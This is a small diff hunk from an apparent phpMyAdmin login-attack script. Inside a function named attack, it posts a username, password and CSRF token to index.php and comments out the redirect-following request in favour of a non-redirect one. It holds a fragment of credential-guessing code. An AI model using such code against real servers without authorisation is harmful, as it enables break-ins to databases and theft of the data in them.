@@ -42,7 +42,7 @@ def attack(url, user, password):
     # print(token)
     post_data = {"pma_username": user, "pma_password": password, "server": "1", "target": "index.php", "token": token}
     # Redirects
-    response = requests.post(url + r"/index.php", data=post_data, allow_redirects=True)
+    # response = requests.post(url + r"/index.php", data=post_data, allow_redirects=True)
     # no Redirects
     response = requests.post(url + r"/index.php", data=post_data, headers=header, allow_redirects=False)
     # flag of success
